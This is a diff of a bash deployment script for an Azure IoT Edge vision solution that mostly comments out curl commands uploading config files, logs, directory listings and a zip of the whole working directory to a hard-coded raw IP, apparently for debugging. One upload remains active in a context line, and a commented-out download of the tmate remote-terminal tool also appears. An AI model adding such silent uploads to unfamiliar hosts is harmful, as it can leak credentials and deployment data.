@@ -51,17 +51,19 @@ echo "$(info) Apt-packages installed"
 # echo "$(info) Installing Azure IoT extension."
 # az extension add --name azure-iot
 # pip -q install --upgrade jsonschema
+echo "Updating pip"
+pip install --upgrade pip
 echo "Installing iotedgedev"
-pip install iotedgedev==2.1.4
+bash -c "pip install iotedgedev==2.1.4" || true
 
 echo "Updating az-cli"
-pip install --upgrade azure-cli
-pip install --upgrade azure-cli-telemetry
+bash -c "pip install --upgrade azure-cli" || true
+bash -c "pip install --upgrade azure-cli-telemetry" || true
 
 echo "installing azure iot extension"
 az extension add --name azure-iot
 
-pip3 install --upgrade jsonschema
+bash -c "pip3 install --upgrade jsonschema" || true
 apk add coreutils
 echo "Installation complete"
 
@@ -97,7 +99,7 @@ rm -rf ${REPO_OUTPUT_DIR}
 rm -f archive.zip
 
 #wget --quiet "https://github.com/linkernetworks/azure-intelligent-edge-patterns/raw/develop/factory-ai-vision/EdgeSolution/archive.zip"
-wget --quiet "https://github.com/linkernetworks/azure-intelligent-edge-patterns/raw/feat/lva-to-ava/factory-ai-vision/EdgeSolution/archive.zip"
+wget --quiet "https://github.com/linkernetworks/azure-intelligent-edge-patterns/raw/feat/cascade-dev/factory-ai-vision/EdgeSolution/archive.zip"
 
 unzip -q archive.zip -d ${REPO_OUTPUT_DIR}
 rm -f archive.zip
@@ -204,25 +206,25 @@ curl -XPOST -F "file=@setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upl
 sed -i 's/yes/no/'  /root/.iotedgedev/setting.ini
 echo "[DEFAULT]" > /root/.iotedgedev/setting.ini
 echo "collect_telemetry = no" >> /root/.iotedgedev/setting.ini
-curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 echo iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > command.log
-curl -XPOST -F "message=`iotedgedev --version`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
-curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "message=`iotedgedev --version`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > genconfig.log
-curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 
-ls -a > ls.log
-curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#ls -a > ls.log
+#curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-ls -a config > ls_config.log
-curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#ls -a config > ls_config.log
+#curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-zip -r 1.zip .
-curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#zip -r 1.zip .
+#curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 #wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
 #tar xf tmate-2.4.0-static-linux-amd64.tar.xz
